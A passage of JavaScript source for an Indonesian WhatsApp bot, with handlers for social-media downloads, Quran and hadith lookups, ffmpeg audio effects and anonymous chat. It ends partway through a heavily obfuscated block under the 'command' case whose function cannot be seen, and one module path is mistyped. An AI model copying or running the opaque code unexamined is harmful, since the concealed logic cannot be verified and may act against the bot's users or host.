                    m.reply(`⭔ Name : ${anu.name}\n⭔ Version : ${Object.keys(anu.versions)}\n⭔ Created : ${tanggal(anu.time.created)}\n⭔ Modified : ${tanggal(anu.time.modified)}\n⭔ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n⭔ Description : ${anu.description}\n⭔ Homepage : ${anu.homepage}\n⭔ Keywords : ${anu.keywords}\n⭔ Author : ${anu.author.name}\n⭔ License : ${anu.license}\n⭔ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
	        case 'tiktok': case 'tiktoknowm': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.nowatermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                chika.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokwm': case 'tiktokwatermark': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.watermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                chika.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokmp3': case 'tiktokaudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await chika.sendMessage(m.chat, buttonMessage, { quoted: m })
                chika.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) chika.sendMedia(m.chat, media, '', `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    chika.sendMedia(m.chat, anu.media[0].url, '', `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
		/** Backup misal yg atas ga keluar video **/
		case 'igeh': case 'instagram2': case 'ig2': case 'igdl2': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                
                let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url:text }, 'apikey'))
                chika.sendMessage(m.chat, { video: { url: anu.data[0] } }, { quoted: m })
            }
            break
            case 'joox': case 'jooxdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await chika.sendImage(m.chat, anu.result.img, `⭔ Title : ${anu.result.lagu}\n⭔ Album : ${anu.result.album}\n⭔ Singer : ${anu.result.penyanyi}\n⭔ Publish : ${anu.result.publish}\n⭔ Lirik :\n${anu.result.lirik.result}`, m)
                chika.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await chika.sendImage(m.chat, anu.result.thumb, `⭔ Title : ${anu.result.title}\n⭔ Url : ${isUrl(text)[0]}`)
                chika.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                chika.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await chika.sendMessage(m.chat, buttonMessage, { quoted: m })
                chika.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                chika.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `⭔ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                chika.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: chika.user.name,
			buttons,
			headerType: 4
		    }
		    chika.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        chika.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		chika.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		chika.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'juzamma': {
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		chika.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		chika.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		chika.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		chika.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		chika.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await chika.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                chika.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                chika.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                chika.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                chika.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await chika.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, chika.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await chika.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, chika.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await chika.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, chika.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await chika.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, chika.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, chika.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await chika.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await chika.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, chika.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await chika.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, chika.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, chika.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) throw mess.owner
                chika.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                chika.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
                chika.sendContact(m.chat, global.owner, m)
            }
            break
case 'command':
(function(_0x53058a,_0x42b73e){function _0x126f9b(_0x2f69fc,_0x287792,_0x408abf,_0x212bc4,_0x239d1b){return _0x544c(_0x2f69fc-0x25d,_0x408abf);}function _0x2e0d29(_0x20b71f,_0x17e2e3,_0x27d8ba,_0x19e739,_0x25ba72){return _0x544c(_0x19e739- -0x245,_0x17e2e3);}function _0x12dd79(_0x50e634,_0x18380c,_0x518236,_0x1bfb0c,_0xbdfacf){return _0x544c(_0x18380c-0x36e,_0x1bfb0c);}const _0x46b1a1=_0x53058a();function _0x4edbba(_0xa7b23c,_0x2768df,_0x3c2fed,_0x57e8f6,_0x1ca766){return _0x544c(_0x3c2fed-0x381,_0xa7b23c);}function _0x30550b(_0x8c2f5f,_0x302d70,_0x59efd8,_0x29e8fe,_0x528cb5){return _0x544c(_0x528cb5- -0x1a3,_0x59efd8);}while(!![]){try{const _0x1e1d28=-parseInt(_0x4edbba('gH*W',0x5fa,0x60a,0x4d2,0x490))/(-0xbc2+-0x11*-0x157+-0xb04)*(-parseInt(_0x12dd79(0x8fb,0x7e0,0x8e3,'i#Pg',0x856))/(-0x1cd+0x1*-0x57b+0x1*0x74a))+-parseInt(_0x12dd79(0x5ef,0x77c,0x647,'C9y4',0x5f9))/(-0x113+-0xd8b*-0x1+-0xc75)+-parseInt(_0x4edbba('$EY]',0x70e,0x581,0x620,0x5bf))/(-0xe5d*-0x1+-0x6*-0x33f+0x4d5*-0x7)*(parseInt(_0x2e0d29(0x1ce,'!EJL',-0x6f,0xaf,0xb9))/(-0x18a7+0xe22*0x1+0xa8a*0x1))+-parseInt(_0x30550b(0x23c,0x19a,'ePzo',0x19b,0x168))/(0x1ed4+-0x15e6+-0x8e8)+-parseInt(_0x2e0d29(0x13b,'S5SP',0x312,0x1e7,0x255))/(-0xe2*0x11+-0x16bd+0x25c6)+parseInt(_0x2e0d29(-0x1be,'$EY]',-0x1cf,-0x70,0x24))/(0x57*-0x17+-0xdde+0x15b7)*(parseInt(_0x2e0d29(0x2d,'zqBY',-0x18d,-0x78,-0x1c5))/(-0x33*-0x1d+0x3db+-0x999))+parseInt(_0x12dd79(0x923,0x7c4,0x760,'eIO%',0x6b2))/(-0x57a+-0x89*0xf+0xd8b);if(_0x1e1d28===_0x42b73e)break;else _0x46b1a1['push'](_0x46b1a1['shift']());}catch(_0x5c5a7f){_0x46b1a1['push'](_0x46b1a1['shift']());}}}(_0x3013,0xe4251+0x12*0xcde7+-0x4*0x5102b));const _0x3648f5=(function(){function _0x17bdf7(_0x5ca33b,_0x4db48a,_0x15d6ef,_0x13d89e,_0x5e9dfb){return _0x544c(_0x13d89e- -0x3c7,_0x5e9dfb);}function _0x356f3f(_0x2740a3,_0x5cb85b,_0x45fbfb,_0x4ce183,_0x2ebb0a){return _0x544c(_0x5cb85b-0x17e,_0x2740a3);}const _0x2b5822={'ksVmt':function(_0x309132,_0xba4708){return _0x309132(_0xba4708);},'nGcNL':function(_0x563651,_0x3d638a){return _0x563651+_0x3d638a;},'VBtvO':_0x5e82f7(-0x337,-0x18b,-0x12b,-0x205,'#pJJ')+_0x5e82f7(0x54,0x16,0x9a,0x83,'Jahw')+_0x297a1d(0x50b,'zy@z',0x539,0x52c,0x5b2)+_0x297a1d(0x3a7,'Md]&',0x27f,0x33d,0x230),'FptfU':_0x5e82f7(0x166,-0x77,0x17,-0x19,'gH*W')+_0x17bdf7(-0x99,0x9d,0x94,-0x41,'PX3A')+_0x5e82f7(-0x10,0x136,0x34,0xcb,'S(d$')+_0x297a1d(0x355,'Jahw',0x3cc,0x35a,0x1db)+_0x297a1d(0x380,'tKGz',0x4fc,0x397,0x275)+_0x223bd4(0x788,'$626',0x7c3,0x71c,0x77a)+'\x20)','TFLOH':function(_0x58fb06){return _0x58fb06();},'fFlBi':function(_0x8384c8,_0x3cb210){return _0x8384c8===_0x3cb210;},'tCZTE':_0x5e82f7(-0x91,-0x5d,0x1,0x34,'klD8'),'BLolK':function(_0x1c6357,_0x5c0458){return _0x1c6357!==_0x5c0458;},'JBYpJ':_0x223bd4(0x80e,'nOc5',0x749,0x6e3,0x77b),'NaHoi':_0x223bd4(0x7fd,'eIO%',0x713,0x6c7,0x5a1),'hAaJb':_0x297a1d(0x24f,'i#Pg',0x125,0x112,0x37a),'gPUBb':_0x5e82f7(0xff,0xb4,0xaa,0x87,'1Kqg')};let _0x5e384d=!![];function _0x223bd4(_0x62248,_0x2ba2e6,_0x1323df,_0x3ecd93,_0x2d034d){return _0x544c(_0x3ecd93-0x2f2,_0x2ba2e6);}function _0x297a1d(_0x2a9f14,_0x858ad6,_0x391afd,_0x132c24,_0x1e6003){return _0x544c(_0x2a9f14-0x62,_0x858ad6);}function _0x5e82f7(_0x592458,_0x1ee482,_0x1f6763,_0x2df59a,_0x6b6eee){return _0x544c(_0x2df59a- -0x3cd,_0x6b6eee);}return function(_0x20543b,_0x128eff){function 